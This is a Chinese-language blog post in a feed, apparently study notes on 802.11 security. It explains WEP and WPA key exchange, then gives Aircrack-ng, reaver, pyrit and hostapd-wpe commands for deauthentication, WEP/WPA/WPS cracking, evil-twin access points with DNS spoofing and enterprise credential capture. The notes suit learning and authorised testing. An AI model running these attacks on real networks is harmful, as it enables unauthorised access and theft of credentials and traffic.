        <content type="html"><![CDATA[<h3 id="无线通信过程"><a href="#无线通信过程" class="headerlink" title="无线通信过程"></a>无线通信过程</h3><h5 id="连接到无线网络"><a href="#连接到无线网络" class="headerlink" title="连接到无线网络"></a>连接到无线网络</h5><ul><li>Probe</li><li><ul><li>STA向所有信道发出probe帧，发现AP</li><li>AP应道Response</li></ul></li><li>Authentication</li><li><ul><li>STA向AP发出验证请求</li><li>发生认证过程（步骤可变）</li><li>AP响应STA的认证结果</li></ul></li><li>Association</li><li><ul><li>STA发出关联请求</li><li>AP响应关联请求</li><li>关联成功，开始通信</li></ul></li></ul><h5 id="WEP-探测过程"><a href="#WEP-探测过程" class="headerlink" title="WEP 探测过程"></a>WEP 探测过程</h5><ul><li>Beacon标识使用WEP加密</li><li>STA发送普通Probe帧</li><li>AP响应Probe Response帧声明其采用WEP加密</li></ul><h5 id="WPA探测过程"><a href="#WPA探测过程" class="headerlink" title="WPA探测过程"></a>WPA探测过程</h5><ul><li>两个AP的Beacon包内容不同，但都声明采用了WPA加密</li><li><ul><li>不同厂商对802.11标准的实现方式不同</li></ul></li><li>包头包含WPA1字段信息</li></ul><h5 id="WEP-OPEN认证过程"><a href="#WEP-OPEN认证过程" class="headerlink" title="WEP OPEN认证过程"></a>WEP OPEN认证过程</h5><ul><li>WEP Open认证与open认证通信过程相同</li><li>正确认证后通信数据被WEP加密</li><li>如果认证时客户端输入错误密码</li><li><ul><li>认证依然可以通过</li><li>AP将丢弃该STA的数据包</li><li><ul><li>起始向量被错误地密钥解密后完整性被破坏</li><li>但数据传输将失败</li></ul></li></ul></li><li>认证响应正确，身份验证成功</li></ul><h5 id="WEP-PSK认证过程"><a href="#WEP-PSK认证过程" class="headerlink" title="WEP PSK认证过程"></a>WEP PSK认证过程</h5><ul><li>STA发认证请求</li><li>AP返回随机Challenge消息</li><li>STA使用PSK加密Cha并发回给AP</li><li>AP使用PSK解密密文，获得Cha并与原始Cha比对，相同则验证成功，不同则验证失败</li><li>大部分无线驱动首先尝试open验证，如失败则尝试PSK</li></ul><h5 id="WEP-共享密钥认证过程"><a href="#WEP-共享密钥认证过程" class="headerlink" title="WEP 共享密钥认证过程"></a>WEP 共享密钥认证过程</h5><ul><li>无论使用什么加密架构，关联过程完全相同</li><li><ul><li>STA向AP发送关联请求</li><li>AP向STA发送关联成功或失败结果</li></ul></li><li>隐藏AP</li><li><ul><li>STA关联包中必须包含目标AP的ESSID</li><li>嗅探到此关联包，说明有隐藏AP存在</li></ul></li></ul><h5 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h5><ul><li>无线安全根源</li><li><ul><li>802.11基于无线电波发射信息</li><li>嗅探侦听是主要问题</li><li>加密机制是必须手段</li></ul></li><li>Wired Equivalent Privacy(WEP)</li><li><ul><li>802.11标准的一部分</li><li>发布后不久被发现存在安全漏洞</li></ul></li><li>Wi-Fi Protected Access (WPA) 取代WEP</li><li><ul><li>WPA2（802.11i标准）</li></ul></li></ul><h5 id="OPEN无加密网络"><a href="#OPEN无加密网络" class="headerlink" title="OPEN无加密网络"></a>OPEN无加密网络</h5><ul><li>无任何加密机制</li><li>所有数据都可以被嗅探</li><li>STA和AP只协商拼配参数即可连入网络</li></ul><h5 id="WEP加密系统"><a href="#WEP加密系统" class="headerlink" title="WEP加密系统"></a>WEP加密系统</h5><ul><li>使用Rivest Cipher 4(RC4) 算法加密流量内容，实现机密性</li><li>CRC32算法检查数据完整性</li><li>标准采用使用24位initialization vector（IV）</li><li>受美国加密技术触控限制法律的要求</li><li><ul><li>高于64bit key禁止出口</li><li>所以除24bit IV 之外真实的key只有40bit的版本被允许出口</li><li>出口限制法律撤销后实现了128bit key 的WEP版本（使用相同的24bit IV）</li></ul></li></ul><h5 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h5><ul><li>RSA实验室研发的对称加密流算法</li><li><ul><li>实现简单</li><li>速度快</li></ul></li><li>加密：对明文流和密钥流进行XOR计算</li><li>解密：对密文流和密钥流进行XOR计算</li><li>RC4算法key由两个过程生成</li><li><ul><li>合并IV和SKA，利用Key Scheduling Algorithm(KSA)算法生成起始状态表</li><li>Pseudo-Random Generation Algorithm(PRGA)算法生成最终密钥流</li></ul></li></ul><h5 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a>WPA安全系统</h5><ul><li>Wi-Fi Protected Access</li><li>802.11i组为提高无线安全，开发两个新的链路层加密协议</li><li><ul><li>Temporal Key Integrity Protocol (TKIP)</li><li><ul><li>WPA1(较之WEP可动态改变密钥)</li></ul></li><li>Counter Mode with CBC-MAC (CCMP)</li><li><ul><li>WPA2</li></ul></li></ul></li><li>WPA加密两种安全类型</li><li><ul><li>WPA个人：使用预设共享密钥实现身份认证</li><li>WPA企业：使用802.1X和Radius服务器实现AAA</li></ul></li><li>WPA1</li><li><ul><li>802.11i第三版草案</li><li>与WEP比较</li><li><ul><li>都采用逐包进行密钥加密</li><li>128位的key和48位的初向量（IV）</li><li>RC4流加密数据</li><li>帧计数器避免重放攻击</li><li>TKIP使用Michael算法进行完整性校验（MIC）<ul><li>WEP CRC32</li></ul></li><li>兼容早期版本硬件</li></ul></li></ul></li><li>WPA2</li><li><ul><li>依据802.11i完全重新设计实现</li><li><ul><li>也被称为Robust Security Network (RSN)</li><li>CCMP 替代TKIP</li><li>AES加密算法取代了RC4</li><li>不兼容早期版本硬件</li></ul></li></ul></li><li>WPA企业连接过程</li><li><ul><li>协商安全协议</li><li>身份认证</li><li>密钥分发和验证</li><li>数据加密完整性</li></ul></li><li>WPA-PSK</li><li><ul><li>协商安全协议</li><li>密钥分发和验证</li><li>数据加密完整性</li></ul></li><li>协商认证方式</li><li><ul><li>PSK/802.1X</li></ul></li><li>单播和组播/广播流量加密套件</li><li><ul><li>TKIP / CCMP</li></ul></li><li>STA通过probe 获取无线网络信息</li><li><ul><li>速率</li><li>加密</li><li>通道</li><li>名称</li></ul></li><li>身份认证（WPA企业）</li><li><ul><li>身份认证基于Extensible Authentication Protocol(EAP)实现</li><li><ul><li>EAP-TLS 需要客户端和服务器证书</li><li>EAP-TTLS</li><li>PEAP混合身份验证，只需要服务器证书</li></ul></li><li>客户端选择身份认证方式</li><li>AP发送身份验证消息给Radius Server</li><li>Radius Server 返回 Radius Accept 表示认证成功</li><li><ul><li>其中包含 Master Key (MK)</li></ul></li><li>AP 通过EAP消息通知STA认证成功</li></ul></li><li>密钥交换</li><li><ul><li><p>无线网络设计用于一组无线设备通信</p></li><li><ul><li><p>关联到同一AP的设备共享无线信道</p></li><li><p>单播、广播、组播</p></li><li><ul><li>安全特性要求不同</li><li>单播通信需要单独密钥加密通信双方流量</li><li>pairwise key :对偶密钥（PTK）</li><li>组播通信需要信任域内所有成员共享的同一密钥</li><li>group key : 组密钥（GTK）</li></ul></li></ul></li></ul></li><li>PMK</li><li><ul><li>安全上下文的顶级密钥</li><li><ul><li>MK进行TLS-PRF加密得出PMK </li></ul></li><li>基于服务密钥</li><li><ul><li>由上层身份验证方法服务器生成</li><li>从服务器通过radius传给AP</li><li>从AP通过EAP消息传给所有STA</li></ul></li><li>基于PSK共享密钥</li><li><ul><li>ESSID + PSK+ 迭代次数4096 —— Hash计算生成</li><li>STA和AP分别计算得出PMK ， 并不在网络中传递互换</li></ul></li><li>256位即32字节</li></ul></li><li>密钥交换</li><li><ul><li>PTK的生成过程</li><li><ul><li>HMAC-SHA1散列算法</li><li>PRF-X散列算法</li></ul></li><li>四步握手过程生成PTK</li><li><ul><li>AP发送Anonce给STA</li><li>STA生成Snonce计算出PTK</li><li>Snonce加PTK的MIC发给AP</li><li>AP拿到Snonce计算出PTK</li><li>AP计算MIC与接收的MIC比对</li><li>MIC一致说明确定STA知道PMK</li><li>AP发GTK给STA</li><li>STA回复ACK并使用密钥加密</li></ul></li></ul></li><li>数据加密和完整性</li><li><ul><li>三种算法</li><li><ul><li>Temporal Key Integrity Protocol (TKIP) 4</li><li>Counter Mode with CBC-MAC (CCMP) 5</li><li>Wireless Robust Authenticated Protocol (WRAP) 6</li></ul></li></ul></li></ul><h3 id="无线渗透实操"><a href="#无线渗透实操" class="headerlink" title="无线渗透实操"></a>无线渗透实操</h3><ul><li>Aircrack-ng</li><li>无线渗透和审计神器</li><li>包含各种功能的工具组件</li><li><ul><li>网络检测</li><li>嗅探抓包</li><li>包注入</li><li>密码破解</li></ul></li><li>检查完卡驱动</li><li>开启和停止无线侦听</li><li><code>airmon-ng check</code></li><li><code>airmon-ng check kill</code></li><li><code>airmon-ng start wlan2</code></li><li><code>iwlist wlan0mon channel</code></li><li><code>airmon-ng stop wlan0mon</code></li><li>无线抓包</li><li><code>airodump-ng wlan2mon</code></li><li><code>airodump wlan2mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap</code></li><li><code>aireplay -9 wlan2mon</code></li><li><code>airreplay</code></li><li><code>airodump-ng wlan0mon</code></li><li><code>airodump-ng wlan0mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap</code></li><li><code>airodump-ng wlan0mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap --ivs</code></li><li><code>BSSID</code> :AP 的MAC地址</li><li><code>PWR</code>： 网卡接收到的信号强度，距离越近信号越强</li><li><code>-1</code>：驱动不支持信号强度，STA距离超出信号接收范围</li><li><code>RXQ</code>： 最近10秒成功接收的数据帧的百分比（数据帧，管理帧），只有在固定信道时才会出现</li><li><code>Beacons</code>: 接收到此AP发送的Beacon帧数量</li><li><code>#Data</code>: 抓到的数据帧数量（WEP表示IV数量），包含广播数据帧</li><li><code>#/s</code>: 最近10秒内，每秒平均抓到的帧的数量</li><li><code>CH</code>: 信道号（从beacon帧中获得），信道重叠时可能发现其他信道</li><li><code>MB</code>：AP支持的最大速率</li><li><code>ENC</code>：采用的无线安全技术WEP、WPA、WPA2、 OPEN</li><li><code>CIPHER</code>:采用的加密套件CCMP、TKIP、WEP40、WEP104</li><li><code>AUTH</code>:身份认证方法MGT、PSK、SKA、OPEN</li><li><code>ESSID</code>: 无线网络名称，隐藏AP此值可能为空，airodump从probe和association request帧中发现隐藏AP</li><li><code>STATION</code>:STA的MAC地址</li><li><code>Lost</code>:通过sequence number 判断最近10秒STA发送丢失的数据包数量（管理帧、数据帧）</li><li><ul><li>干扰、距离</li><li>发包不能收、收包不能发</li></ul></li><li><code>Packets</code>: STA 发送的数据包数量</li><li><code>Probes</code>:STA探测的ESSID</li></ul><h4 id="AIRODUMP-NG排错"><a href="#AIRODUMP-NG排错" class="headerlink" title="AIRODUMP-NG排错"></a>AIRODUMP-NG排错</h4><ul><li>不显示任何AP和STA信息</li><li><ul><li>物理机场景下使用笔记本内置无线网卡时，确保BIOS中已启用无线网卡</li><li>确认无线网卡在managed模式下可以正常工作</li><li>尝试禁用network-manager服务</li><li>尝试卸载rmmod和重新加载modprobe驱动</li></ul></li><li>工作一段时间后airodump-ng无法继续抓包</li><li><ul><li>airmon-ng check kill</li><li>确认wpa_supplicant 进程已停止</li></ul></li></ul><h5 id="AIREPLAY-NG"><a href="#AIREPLAY-NG" class="headerlink" title="AIREPLAY-NG"></a>AIREPLAY-NG</h5><ul><li>产生或者加速无线通信流量</li><li><ul><li>向无线网络中注入数据包</li><li><ul><li>伪造身份验证</li><li>强制重新身份验证</li><li>抓包重放</li></ul></li><li>用于后续WEP和WPA密码破解</li><li>支持10种包注入</li></ul></li><li>获取包的两种途径</li><li><ul><li>指定接口（-i）</li><li>抓包文件pcap(-r)</li></ul></li><li>aireplay-ng <options> <interface name=""></interface></options></li><li>Filter命令选项（除0、1两种攻击方式）</li></ul><h5 id="AIREPLAY-NG-排错"><a href="#AIREPLAY-NG-排错" class="headerlink" title="AIREPLAY-NG 排错"></a>AIREPLAY-NG 排错</h5><ul><li>Aireplay-ng 命令挂起没有任何输出</li><li><ul><li>无线网卡与AP工作在不同信道</li></ul></li><li>报错“write failed: Cannot allocate memory wi_write():illegal seek”</li><li><ul><li>无线网卡使用Broadcom芯片 （bcm43xx), 替换为b43驱动可解决</li></ul></li><li>可注入但速度很慢，并提示内核信息”rtc: lost some interrupts at 1024Hz”</li><li><ul><li>没有修正方法，此时可以启动多个aireplay-ng命令提高速度</li></ul></li><li>使用-h参数指定注入MAC地址与网卡MAC地址不一致报错</li><li><ul><li>建议保持一致（macchange)</li></ul></li></ul><h5 id="AIREPLAY-NG-包注入测试"><a href="#AIREPLAY-NG-包注入测试" class="headerlink" title="AIREPLAY-NG 包注入测试"></a>AIREPLAY-NG 包注入测试</h5><ul><li>检测网卡是否可以注入包</li><li>检测AP的响应时间</li><li><ul><li>回包率反应链路质量</li></ul></li><li>如果有两个无线网卡，可以检测具体可以注入哪种攻击</li><li>基本测试检测AP对Probe广播的响应</li><li><ul><li>向每AP发30包</li><li>网卡成功发送并可接收包的能力</li></ul></li><li>基本测试</li><li><ul><li><code>airplay -9 wlan0mon</code></li></ul></li><li>向隐藏AP/指定SSID注入</li><li><ul><li><code>aireplay-ng -9 -e leven -a EC:26:CA:FA:02:DC wlan0mon</code></li></ul></li><li>card to card 注入测试</li><li><ul><li>具体攻击方式</li><li>-i 作为AP的网卡</li><li>5/7 Faild</li><li><ul><li>注入MAC和真实MAC相同时可以正常使用</li></ul></li></ul></li></ul><h5 id="MAC地址绑定攻击"><a href="#MAC地址绑定攻击" class="headerlink" title="MAC地址绑定攻击"></a>MAC地址绑定攻击</h5><ul><li>管理员误以为MAC绑定是一种安全机制</li><li>限制可以关联的客户端MAC地址</li><li>准备AP</li><li><ul><li>AP基本配置</li><li>OPEN认证</li><li>开启无线过滤</li></ul></li><li>修改MAC地址绕过过滤</li></ul><h4 id="WEP攻击"><a href="#WEP攻击" class="headerlink" title="WEP攻击"></a>WEP攻击</h4><ul><li>WEP密码破解原理</li><li><ul><li>IV并非完全随机</li><li>每224个包可能出现一次IV重用</li><li>收集大量IV 之后找出相同IV及其对应密文，分析得出共享密码</li></ul></li><li>ARP回包中包含IV</li><li>IV足够多的情况下，任何复杂程度的WEP密码都可以被破解</li><li>启动monitor模式</li><li>启动抓包并保存抓包</li><li>Deauthentication 抓取XOR 文件</li><li>利用XOR文件与AP建立关联</li><li>执行ARP重放</li><li>Deauthentication 触发ARP数据包</li><li>收集足够DATA之后破解密码</li><li>WEP破解全部需要首先伪造认证，以便与AP进行正常通信</li><li>不产生ARP数据包</li><li><code>aireplay-ng -1 0 -e kifi -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</code></li><li><code>aireplay-ng -1 60 -o 1 -q 10 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;YourMAC&gt;&lt;interface&gt;</code></li><li><ul><li>每6000秒发送reauthentication</li><li>-o 1 每次身份认证只发一组认证数据包</li><li>-q 10 每10秒发keep-live帧</li></ul></li><li>某些AP验证客户端MAC地址OUI （前三个字节）</li><li>MAC地址过滤</li><li>Denied(Code 1 )is WPA in use</li><li><ul><li>WPA/WPA2不支持Fake authentication</li></ul></li><li>使用真实MAC地址</li><li>物理靠经AP</li><li>侦听信道正确</li></ul><h5 id="Deautnentication-攻击"><a href="#Deautnentication-攻击" class="headerlink" title="Deautnentication 攻击"></a>Deautnentication 攻击</h5><ul><li>强制客户端与AP断开关联</li><li><ul><li>重连生成ARP请求，AP回包包含IV</li><li>WPA重连过程抓取4步握手过程</li><li>无客户端情况下此攻击无效</li></ul></li><li><code>aireplay-ng -0 0 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface name&gt;</code></li><li><ul><li>不指定-c 参数时，以广播攻击所有客户端</li><li>每攻击发送128个包，64个给AP，64个给客户端</li><li>物理足够接近被攻击者</li><li>与被攻击者使用相同无线标准b\n\g</li><li>客户端可能拒绝广播帧，建议指定客户端</li></ul></li></ul><h5 id="ARP重放"><a href="#ARP重放" class="headerlink" title="ARP重放"></a>ARP重放</h5><ul><li>侦听正常的ARP包并重放给AP</li><li>AP回包中包含大量弱IV</li><li><code>aireplay-ng -3 -b &lt;AP MAC&gt; -h &lt;Source MAC&gt;&lt;interface name&gt;</code></li><li><ul><li>-h 合法客户端/供给者MAC</li></ul></li><li>Airodump-ng data 字段</li><li><ul><li>64bit密钥 ： 25万</li><li>128bit密钥： 150万</li></ul></li><li><code>airecrack-ng wep.cap</code></li></ul><h4 id="WPA-攻击"><a href="#WPA-攻击" class="headerlink" title="WPA 攻击"></a>WPA 攻击</h4><p><code>HTTP://ETUTORIALS.ORG/NETWORKING/802.11+SECURITY.+WI-FI+PROTECTED+ACCESS+AND+802.11I/</code></p><h5 id="WPA-PSK-攻击"><a href="#WPA-PSK-攻击" class="headerlink" title="WPA PSK 攻击"></a>WPA PSK 攻击</h5><ul><li>只有一种密码破解方法</li><li><ul><li>WPA不存在WEP的弱点</li></ul></li><li>只能暴力破解</li><li><ul><li>CPU资源</li><li>时间</li><li>字典质量</li><li><ul><li>网上共享的字典</li><li>泄露密码</li><li>地区电话号码段</li><li>Crunch生成字典</li><li>Kali自带的字典文件</li></ul></li></ul></li><li>PSK破解过程</li><li><ul><li>启动monitor</li><li>开始抓包并保存</li><li>Deauthentication 攻击获取4步握手信息</li><li>使用字典暴力破解</li></ul></li><li>无AP情况下的WPA密码破解</li><li><ul><li>启动monitor</li><li>开始抓包并保存</li><li>根据probe信息伪造相同ESSID的AP</li><li>抓取4步握手中的前两个包</li><li>使用字典暴力破解</li></ul></li><li>AIROLIB破解密码</li><li><ul><li>设计用于存储ESSID和密码列表</li><li><ul><li>计算生成不变的PMK（计算资源消耗型）</li><li>PMK在破解阶段被用于计算PTK（速度快，计算资源要求少）</li><li>通过完整性摘要值破解密码</li><li>SQLite3数据库存储数据</li></ul></li><li><code>echo kifi &gt; essid.txt</code></li><li><code>airolib-ng db --import essid essid.txt</code></li><li><code>airolib-ng db --stats</code></li><li><code>airolib-ng db --import passwd &lt;wordlist&gt;</code></li><li><ul><li>自动剔除不合格的WPA字典</li></ul></li><li><code>airolib-ng db –batch</code></li><li><ul><li>生成PMK</li></ul></li><li><code>aircrack-ng -r db wpa.cap</code></li></ul></li><li>JTR 破解密码</li><li><ul><li>John the ripper</li><li><ul><li>快速的密码破解软件</li><li>支持基于规则扩展密码字典</li></ul></li><li>很多人喜欢用手机号码做无线密码</li><li><ul><li>获取号段并利用JTR规则增加最后几位的数字</li></ul></li><li>配置文件 /etc/john/john.conf</li><li><ul><li><code>[List.Rules:Wordlist]</code></li><li><code>$[0-9]$[0-9]$[0-9]</code></li></ul></li><li>测试效果</li><li><ul><li><code>john --wordlist=password.lst --rules --stdout | grep -i Password123</code></li></ul></li><li>破解调用</li><li><ul><li><code>john --wordlist=pass.list --rules --stdout | aircrack-ng -e kifi -w - wpa.cap</code></li></ul></li></ul></li><li>COWPATTY 破解密码</li><li><ul><li>WPA密码通用破解工具</li><li>使用密码字典</li><li><ul><li><code>cowpatty -r wpa.cap -f password.lst -s kifi</code></li></ul></li><li>使用彩虹表（PMK）</li><li><ul><li><code>genpmk -f password.lst -d pmkhash -s kifi</code></li><li><code>cowpatty -r wpa.cap -d pmkhash -s kifi</code></li></ul></li></ul></li><li>PYRIT 破解密码</li><li><ul><li>与airolib\ cowpatty 相同，支持基于预计算的PMK提高破解速度</li><li>独有的优势</li><li><ul><li>除CPU之外Pyrit 可以运用GPU的强大运算能力加速生成PMK</li><li>本身支持抓包获取四步握手过程，无需用Airodum抓包</li><li>也支持传统的读取airodump抓包获取四步握手方式</li></ul></li><li>只抓取WAP四次握手过程包</li><li><ul><li><code>pyrit -r wlan2mon -o wpapyrit.cap stripLive</code></li><li><code>pyrit -r wpapyrit.cap analyze</code></li></ul></li><li>从airodump 抓包导入并筛选</li><li><ul><li><code>pyrit -r wpa.cap -o wpapyrit.cap strip</code></li></ul></li><li>使用密码字典直接破解</li><li><ul><li><code>pyrit -r wpapyrit.cap -i password.lst -b &lt;AP MAC&gt; attack_passthrough</code></li></ul></li><li>数据库模式破解</li><li><ul><li>默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库</li><li>查看默认数据库状态： <code>pyrit eval</code></li><li>导入密码字典： <code>pyrit -i password.lst import_passwords</code> (剔除了不合规的密码)</li><li>指定ESSID： <code>pyrit -e kifi create_essid</code></li><li>计算PMK： <code>pyrit batch</code> (发挥GPU计算能力)</li><li>破解密码： <code>pyrit -r wpapyrit.cap -b &lt;AP MAC&gt; attack_db</code></li></ul></li></ul></li></ul><h4 id="WPS-攻击"><a href="#WPS-攻击" class="headerlink" title="WPS 攻击"></a>WPS 攻击</h4><ul><li>WPS是WiFi联盟2006年开发的一项技术</li><li><ul><li>通过PIN码来简化无线接入的操作，无需记住PSK</li><li>路由器和网卡各按一个按钮就能接入无线</li><li>PIN码是分为前后各4位的2段共8位数字</li></ul></li><li>安全漏洞</li><li><ul><li>2011年被发现安全涉及漏洞</li><li>接入发起方可以根据路由器的返回信息判断前4位是否正确</li><li>而PIN码的后4位只有1000种定义的组合（最后一位是checksum)</li><li>所以全部穷举破解只需要11000次尝试</li><li><ul><li>PSK：218，340，105，584，896</li></ul></li><li>标准本身没有设计锁定机制，目前多个厂商已实现锁定机制</li></ul></li><li>包括Linksys 在内的很多厂家的无线路由器无法关闭WPS功能</li><li>即使在web界面中关闭WPS，配置也不会生效</li><li>攻击难度相对较低，防御却十分困难</li><li>一般可在4-10小时爆破密码</li><li><ul><li>PSK</li></ul></li><li>用计算器直接算出PIN</li><li><ul><li>C83A35</li><li>00B00C</li></ul></li><li>启动侦听模式后，发现支持WPS的AP</li><li><ul><li><code>wash -C -i wlan0mon</code></li><li><code>airodump-ng wlan0mon --wps</code></li></ul></li><li>爆破PIN码</li><li><ul><li><code>reaver -i wlan0mon -b &lt;AP mac&gt; -vv</code></li></ul></li><li>秒破PIN码</li><li><ul><li><code>reaver -i wlan0mon -b &lt;AP mac&gt; -vv -K 1</code></li><li>pixiewps</li><li>只适用与固定厂商的芯片，成功率很低</li></ul></li><li><code>reaver -i wlan0mon -b &lt;AP mac&gt; -vv -p 88888888</code></li><li>问题：</li><li><ul><li>很多厂家实现了锁定机制，所以爆破时应注意限速</li><li>一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定</li></ul></li><li>综合自动无线密码破解工具 wifite</li></ul><h5 id="EVIL-TWIN-AP-ROGUE-AP"><a href="#EVIL-TWIN-AP-ROGUE-AP" class="headerlink" title="EVIL TWIN AP / ROGUE AP"></a>EVIL TWIN AP / ROGUE AP</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng -a &lt;AP mac&gt; --essid “kifi” -c 11 wlan2mon</span><br><span class="line">apt-get install bridge-utils</span><br><span class="line">brctl addbr bridge</span><br><span class="line">brctl addif Wifi-Bridge eth0</span><br><span class="line">brctl addif Wifi-Bridge at0</span><br><span class="line">ifconfig eth0 0.0.0.0 up</span><br><span class="line">ifconfig at0 0.0.0.0 up</span><br><span class="line">ifconfig bridge 192.168.1.10 up</span><br><span class="line">route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">dnspoof -i bridge -f dnsspoof.hosts</span><br><span class="line">• /usr/share/dsniff/dnsspoof.hosts</span><br><span class="line">apachet2ctl start</span><br></pre></td></tr></table></figure><ul><li>3vilTwinAttacker<br><code>git clone https://github.com/P0cL4bs/3vilTwinAttacker.git</code><br><code>cd 3vilTwinAttacker</code><br><code>chmod +x installer.sh</code><br><code>./installer.sh --install</code></li></ul><h5 id="WPA企业"><a href="#WPA企业" class="headerlink" title="WPA企业"></a>WPA企业</h5><ul><li>hostapd-wpe</li><li>取代了 FreeRADIUS-wpe</li><li>EAP-FAST/MSCHAPv2 (Phase 0)</li><li>PEAP/MSCHAPv2</li><li>EAP-TTLS/MSCHAPv2</li><li>EAP-TTLS/MSCHAP</li><li>EAP-TTLS/CHAP</li><li>EAP-TTLS/PAP</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/OpenSecurityResearch/hostapd-wpe</span><br><span class="line">apt-get install libssl-dev libnl-dev</span><br><span class="line">libnl1 libnl-dev 包不在 kali2.0的官方库中</span><br><span class="line">wget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl-dev_1.1-7_amd64.deb</span><br><span class="line">wget http://ftp.debian.org/debian/pool/main/libn/libnl/</span><br><span class="line">libnl1_1.1-7_amd64.deb</span><br><span class="line">dpkg -i libnl1_1.1-7_amd64.deb</span><br><span class="line">dpkg -i libnl-dev_1.1-7_amd64.deb</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gz</span><br><span class="line">tar -zxf hostapd-2.2.tar.gz</span><br><span class="line">cd hostapd-2.2</span><br><span class="line">patch -p1 &lt; ../hostapd-wpe/hostapd-wpe.patch</span><br><span class="line">cd hostapd</span><br><span class="line">make</span><br></pre></td></tr></table></figure><ul><li>生成证书</li><li><ul><li><code>cd ../../hostapd-wpe/certs</code><br><code>./bootstrap</code></li><li><code>service network-manager stop</code></li><li><code>airmon-ng check kill</code></li><li>映射无线网卡</li><li><code>ifconfig wlan0 up</code></li><li>启动伪造AP</li><li><code>cd ../../hostapd-2.2/hostapd</code></li><li><code>./hostapd-wpe hostapd-wpe.conf</code></li><li><code>asleap -C challenge -R response -W &lt;Dictionary_File&gt;</code></li></ul></li></ul><h5 id="AIRDECAP-NG"><a href="#AIRDECAP-NG" class="headerlink" title="AIRDECAP-NG"></a>AIRDECAP-NG</h5><ul><li>去除802.11头</li><li><ul><li><code>airdecap-ng -b &lt;AP MAC&gt; 1.pcap</code></li></ul></li><li>解密WEP加密数据</li><li><ul><li><code>airdecap-ng -w &lt;WEP key&gt;-b &lt;AP MAC&gt; 1.pcap</code></li><li>必须有与AP建立关联关系</li></ul></li><li>解密WPA加密数据</li><li><ul><li><code>airdecap-ng -e kifi -p &lt;PSK&gt; -b &lt;AP MAC&gt; 1.pcap</code></li><li>抓包文件中必须包含4步握手信息，否则无解</li></ul></li></ul><h5 id="AIRSERV-NG"><a href="#AIRSERV-NG" class="headerlink" title="AIRSERV-NG"></a>AIRSERV-NG</h5><ul><li>通过网络提供无线网卡服务器</li><li><ul><li>某些网卡不支持客户端/服务器模式</li></ul></li><li>启动无线侦听</li><li>服务器端</li><li><ul><li><code>airserv-ng -p 3333 -d wlan2mon</code></li></ul></li><li>客户端</li><li><ul><li><code>airodump-ng 192.168.1.1:3333</code></li></ul></li><li>某些防火墙会影响C/S间的通信</li></ul><h5 id="AIRTUN-NG"><a href="#AIRTUN-NG" class="headerlink" title="AIRTUN-NG"></a>AIRTUN-NG</h5><ul><li>无线入侵检测wIDS</li><li><ul><li>无线密码和BSSID</li><li>需要获取握手信息</li></ul></li><li>中继和重放</li><li><ul><li>Repeate / Replay</li></ul></li><li>wIDS</li><li><ul><li><code>WEP: airtun-ng -a &lt;AP MAC&gt; -w SKA wlan2mon</code></li><li><code>WPA: airtun-ng -a &lt;AP MAC&gt; -p PSK -e kifi wlan2mon</code></li><li><code>ifconfig at0 up</code></li><li>四步握手</li><li>理论上支持多AP的wIDS，但2个AP以上时可靠性会下降</li><li><ul><li><code>WPA: airtun-ng -a &lt;AP MAC&gt; -p PSK -e kifi1 wlan2mon</code></li><li><code>ifconfig at1 up</code></li><li>多AP不同信道时 airodump -c 1,11 wlan2mon</li></ul></li></ul></li><li>Repeate</li><li><ul><li>WDS/Bridge</li><li>扩展无线侦听的距离</li><li>要求两块网卡都置入monitor模式</li><li><code>airtun-ng -a &lt;AP MAC&gt; --repeat --bssid &lt;AP MAC&gt; -i wlan0mon wlan2mon</code></li><li>wlan0mon: 收包的网卡</li><li>wlan2mon：发包的网卡</li><li>-a: 发包的源地址</li><li>–bssid: 过滤只发指定源地址的包（可选）</li></ul></li><li>Replay<ul><li>将抓取的CAP文件重放到指定网卡</li><li><code>airtun-ng -a &lt;Source MAC&gt; -r 1.cap &lt;interface&gt;</code></li></ul></li></ul><h4 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h4><ul><li>bessid-ng</li><li>fern-wifi-cracker</li><li>kismet<ul><li>kismet*.nettxt</li><li>kismet*.pcapdump</li></ul></li><li><code>gpsd -n -N -D4 /dev/ttyUSB0</code></li><li><code>giskismet -x Kismet-*.netxml</code></li><li><code>giskismet -q &quot;select * from wireless&quot; -o gps.kml</code></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>802.11_2</title>
      <link href="/2018/03/28/802-11-2/"/>
      <url>/2018/03/28/802-11-2/</url>
      
